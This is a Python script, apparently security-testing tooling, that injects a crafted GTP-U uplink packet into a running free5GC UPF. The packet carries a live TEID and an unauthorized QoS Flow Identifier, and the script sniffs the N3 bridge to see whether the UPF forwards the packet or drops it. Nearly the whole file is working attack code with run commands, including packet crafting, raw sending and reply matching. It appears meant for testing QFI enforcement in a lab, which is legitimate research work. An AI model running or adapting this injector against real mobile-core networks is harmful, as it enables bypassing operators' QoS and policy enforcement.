"""Live uplink QFI/QER-mismatch injector against a running free5GC UPF.

Unlike generate_attack_pcap.py (which writes a pcap), this sends the attack
packet ONTO the wire so a real gtp5g UPF actually processes it, and reports
whether the UPF *enforced* the unauthorized QFI or *forwarded* it.

Transport: the GTP-U packet is sent over a plain UDP socket to the UPF's N3
IP:2152. The host routes there over the N3 bridge, so this needs NO root. The
outer source IP is the host's bridge IP rather than the gNB's — which is fine,
because free5GC's uplink PDR matches on TEID (+ N3 interface), not on the outer
source address. What rides inside is what matters:

    GTP-U(TEID = live uplink TEID)                 # so the UPF's UL PDR accepts it
      PDU Session Container(pdu_type=1, QFI = <unauthorized>)
        IP(src = UE IP, dst = probe dst) / ICMP echo-request (unique id)

Verdict: the inner ICMP echo-request travels UE->DN. If the UPF forwards it
(does NOT verify the uplink QFI against the authorized set), the DN's reply is
reverse-NATed and encapsulated back downlink toward the gNB, visible on the N3
bridge with our unique ICMP id. Seeing that reply == forwarded (enforcement
gap). No reply == dropped/enforced.

Auto-verdict needs to sniff the bridge (root). Run with sudo for a one-shot
verdict; or run without sudo to just send, and watch the reply yourself with:
    sudo tshark -i br-free5gc -f "udp port 2152" -Y icmp \
      -T fields -e ip.src -e ip.dst -e icmp.type -e icmp.id

    sudo ./upfvenv/bin/python3 inject_qfi_attack.py --qfi 7   # attack
    sudo ./upfvenv/bin/python3 inject_qfi_attack.py --qfi 1   # benign control (should FORWARD)
"""

import argparse
import random
import socket
import time

from scapy.all import IP, ICMP, AsyncSniffer
from scapy.contrib.gtp import GTP_U_Header  # noqa: F401  (ensures contrib bind_layers load)

from gtpu_scapy import build_gtpu_packet


def build_gtpu_bytes(ue_ip, dst_ip, teid, qfi, icmp_id, icmp_seq):
    """Serialize one unauthorized-QFI uplink G-PDU (payload for the UDP socket)."""
    inner = IP(src=ue_ip, dst=dst_ip) / ICMP(type=8, id=icmp_id, seq=icmp_seq)
    return bytes(build_gtpu_packet(teid=teid, pdu_type=1, QFI=qfi, payload=inner))


def main():
    p = argparse.ArgumentParser(description="Inject an unauthorized-QFI uplink G-PDU at a live free5GC UPF.")
    p.add_argument("--iface", default="br-free5gc", help="N3 bridge, for the reply sniff (default: br-free5gc)")
    p.add_argument("--teid", type=lambda x: int(x, 0), default=0x2, help="Live uplink TEID the UPF expects (default: 0x2)")
    p.add_argument("--qfi", type=int, default=7, help="QFI to mark; UNAUTHORIZED = attack (default: 7). QFI 1 = benign control.")
    p.add_argument("--upf-ip", default="10.100.200.2", help="UPF N3 IP (UDP destination)")
    p.add_argument("--ue-ip", default="10.60.0.1", help="Inner source = UE tunnel IP")
    p.add_argument("--dst", default="8.8.8.8", help="Inner destination to probe (default: 8.8.8.8)")
    p.add_argument("--count", type=int, default=1, help="Number of attack packets to send (default: 1)")
    p.add_argument("--interval", type=float, default=0.2, help="Seconds between packets (default: 0.2)")
    p.add_argument("--wait", type=float, default=3.0, help="Seconds to wait for a downlink reply after the last send")
    p.add_argument("--no-sniff", action="store_true", help="Just send; don't try to sniff for the verdict")
    args = p.parse_args()

    icmp_id = random.randint(0x1000, 0xFFFF)
    label = "BENIGN CONTROL" if args.qfi == 1 else "ATTACK (unauthorized QFI)"
    print(f"== {label} ==")
    print(f"  TEID={hex(args.teid)}  QFI={args.qfi}  ICMP id={hex(icmp_id)}")
    print(f"  -> UDP {args.upf_ip}:2152   inner {args.ue_ip} -> {args.dst}  x{args.count}")

    # Optional reply sniffer (needs root). Degrade gracefully if unprivileged.
    sniffer = None
    if not args.no_sniff:
        try:
            sniffer = AsyncSniffer(iface=args.iface, filter="udp port 2152", store=True)
            sniffer.start()
            time.sleep(0.5)
        except (PermissionError, OSError) as e:
            print(f"  [note] cannot sniff for auto-verdict ({e}); sending only. "
                  f"Watch the reply with: sudo tshark -i {args.iface} -f 'udp port 2152' -Y icmp "
                  f"-T fields -e ip.src -e ip.dst -e icmp.type -e icmp.id  (look for icmp.id={hex(icmp_id)}, icmp.type=0)")
            sniffer = None

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for seq in range(1, args.count + 1):
        sock.sendto(build_gtpu_bytes(args.ue_ip, args.dst, args.teid, args.qfi, icmp_id, seq),
                    (args.upf_ip, 2152))
        if args.interval and seq < args.count:
            time.sleep(args.interval)
    sock.close()
    print(f"  sent {args.count} G-PDU(s)")

    if sniffer is None:
        return

    print(f"  waiting {args.wait}s for a downlink reply...")
    time.sleep(args.wait)
    pkts = sniffer.stop()

    # In a downlink G-PDU the ICMP sits under the INNER IP; getlayer(IP) would
    # return the OUTER IP (dst = gNB), so match on the inner IP under ICMP.
    all_replies = 0        # any inner ICMP echo-reply, whatever id (diagnostic)
    replies = []           # our specific reply, by unique ICMP id
    for pk in pkts:
        ic = pk.getlayer(ICMP)
        if ic is None or ic.type != 0:
            continue
        all_replies += 1
        inner = ic.underlayer  # inner IP: echo reply src=DN, dst=UE
        if ic.id == icmp_id and getattr(inner, "dst", None) == args.ue_ip:
            replies.append(pk)

    print(f"  captured {len(pkts)} N3 packet(s); {all_replies} inner echo-reply(ies) total, "
          f"{len(replies)} matching our id {hex(icmp_id)}")
    if replies:
        print(f"  VERDICT: FORWARDED  -> UPF did NOT enforce the uplink QFI (QFI={args.qfi} accepted). Enforcement gap.")
    else:
        print(f"  VERDICT: NO REPLY   -> UPF dropped/enforced it (or DN unreachable). Try --qfi 1 to confirm path+method.")


if __name__ == "__main__":
    main()
